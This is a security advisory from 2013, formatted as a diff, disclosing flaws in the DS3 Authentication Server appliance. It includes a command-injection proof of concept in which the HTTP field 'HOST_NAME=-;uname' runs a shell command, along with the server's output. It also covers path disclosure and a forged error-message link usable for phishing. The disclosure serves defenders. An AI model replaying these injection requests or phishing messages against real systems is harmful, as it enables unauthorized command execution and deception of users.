@@ -1,0 +1,205 @@
+Original: http://www.digitalsec.net/stuff/explt+advs/DS3.AuthServer.txt
+
+
+
+          ===============================
+                   - Advisory -
+          ===============================
+
+  Tittle:   DS3 Authentication Server - Command Execution (Post
+Authentication) & other minor issues
+    Risk:   High
+    Date:   27.May.2013
+  Author:   Pedro Andujar
+
+
+.: [ INTRO ] :.
+
+The DS3 Authentication Server appliance is a high performance appliance that
+provides multifactor authentication with end-to-end encryption of keys
+protected by a
+FIPS-certified Hardware Security Module (HSM).
+
+.: [ TECHNICAL DESCRIPTION ] :.
+
+DS3 Authentication Server (unknown version) is prone to several security
+issues as described below;
+
+
+.: [ ISSUE #1 }:.
+
+Name: Command execution
+Severity: High
+
+Authentication server provides different admin tools to perform connectivity
+checks. TestTelnetConnection.jsp doesn't validate the user input, allowing an
+attacker to execute arbitrary commands in the server side with the privileges
+of asadmin user.
+
+POST /ServerAdmin/TestTelnetConnection.jsp HTTP/1.1
+Host: x.x.x.x
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101
+Firefox/19.0
+Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://x.x.x.x/ServerAdmin/TestTelnetConnection.jsp
+Cookie: 70746573745f61646d696e00=English.properties;
+70746573745f63696300=English.properties;
+JSESSIONID=8F457BB84D7B80F49D197D92360F1F95
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90142
+
+HOST_NAME=-;uname&PORT_NUMBER=-a
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Date: Fri, 05 Apr 2013 22:54:18 GMT
+Server: DS3-AuthServer
+Content-Length: 12648
+
+<HTML>
+<HEAD>
+<TITLE>Test Telnet Connection</TITLE>
+<meta http-equiv="Cache-Control" content="no-cache" />
+<meta http-equiv="pragma" content="no-cache">
+<SCRIPT Language="JavaScript">function doSubmit()
+...[SNIP]...
+<TD COLSPAN=2>
+<TEXTAREA ROWS="10" COLS="80" READONLY NAME="TEST_RESULTS">Start time : Fri
+Apr 05 06:57:17 SGT 2013
+End time : Fri Apr 05 06:57:17 SGT 2013
+Time taken (ms): 39
+
+Attempting connection to -;uname on port -a
+Linux authserver 2.6.32.22 #1 SMP Thu Sep 30 08:51:06 SGT 2010 i686
+i686 i386 GNU/Linux
+
+-/telnet: Temporary failure in name resolution
+Successful connection to -;uname on port -a&lt;/textarea&gt;
+ ...[SNIP]...
+
+
+
+.: [ ISSUE #2 }:.
+
+Name: Physical Path Disclosure
+Severity: Low
+
+TestDRConnection.jsp, shows the file path in the error messages, this is
+considered a minor information leak.
+
+
+POST /ServerAdmin/TestDRConnection.jsp HTTP/1.1
+Host: x.x.x.x
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101
+Firefox/19.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://x.x.x.x/ServerAdmin/TestDRConnection.jsp
+Cookie: 70746573745f61646d696e00=English.properties;
+JSESSIONID=397BA78713A66EE6968BAAB237C6C6EF
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 264
+HOST_NAME=localhost&FILE_SIZE=&PACKET_SIZE=&MTU_SIZE=
+
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Content-Length: 3081
+Date: Thu, 04 Apr 2013 01:34:18 GMT
+Server: DS3-AuthServer
+<HTML>
+<HEAD>
+<TITLE>Test DR Connection</TITLE>
+...[SNIP]...
+<TD COLSPAN=2>
+<TEXTAREA ROWS="10" COLS="80" READONLY NAME="TEST_RESULTS">
+FCOPY-W-NOSERV , service fcopy$server is unknown.
+FCOPY-I-DEFPORT , using FASTCopy default port 5745
+FCOPY-E-NETLOGIN, remote login failed on node localhost
+ -REG-E-OPEN, error opening registry file </home/asadmin/softlink.reg>
+ -SYS-E-ERRMSG, No such file or directory
+ -SEC-E-NOAPPLN, permission rejected at security file /etc/softlink.login,
+line #9
+ -SEC-E-NOAPPRS, Invalid login settings in softlink.login
+&lt;/textarea&gt;
+
+
+
+.: [ ISSUE #3 }:.
+
+Name: User Controlable Error Message
+Severity: Low
+
+Without being authenticaticated, any user is able to manipulate the message of
+the default error page, helping him to develop social engineering attacks. This
+could be done as follows;
+
+https://x.x.x.x/ServerAdmin/ErrorViewer.jsp?message=Message forged
+example, please visit www.ev1lsite.com.au
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 669
+Date: Mon, 25 Mar 2013 05:39:50 GMT
+Server: DS3-AuthServer
+<HTML>
+<HEAD>
+<TITLE>Error Page</TITLE>
+<meta http-equiv="Cache-Control" content="no-cache" />
+<meta http-equiv="pragma" content="no-cache">
+<link rel="stylesheet" href="/ServerAdmin/ServerAdmin.css" type="text/css"
+title="ServerAdmin Style Sheet">
+</HEAD>
+<BODY>
+<IMG src="image/oem-logo-small.jpg" border=0>
+<FONT class=CommonHeader>Error Message</FONT><BR>
+<IMG src="image/line.gif" border=0><BR><BR>
+<TABLE class=MsgTable Height=4 Width=435>
+<TR>
+<TD><B>Error Message:</B></TD>
+<TD>Message forged example, please visit www.ev1lsite.com.au</TD>
+</TR>
+</TABLE>
+<BR><IMG src="image/line.gif" border=0>
+</BODY>
+</HTML>
+
+
+
+.: [ CHANGELOG ] :.
+
+  * 05/Apr/2013:   - Bugs found - Reported customer.
+  * 27/May/2013:   - Send this report to the vendor as well.
+  * 02/Jun/2013:   - Public Disclosure
+
+
+.: [ SOLUTIONS ] :.
+
+N/A
+
+
+.: [ REFERENCES ] :.
+
+   [+] DS3 Data Security Systems Solutions
+    http://ds3global.com
+
+   [+] DS3 Authentication Server
+    http://ds3global.com/index.php/en/ds3-authentication-server/ds3-authentication-server
+
+   [+] Ernst & Young Advanced Security Centre - Melbourne
+    http://www.ey.com/security/
+
+   [+] !dSR - Digital Security Research
+    http://www.digitalsec.net/
+
+
+
+
+
+                    -=EOF=-
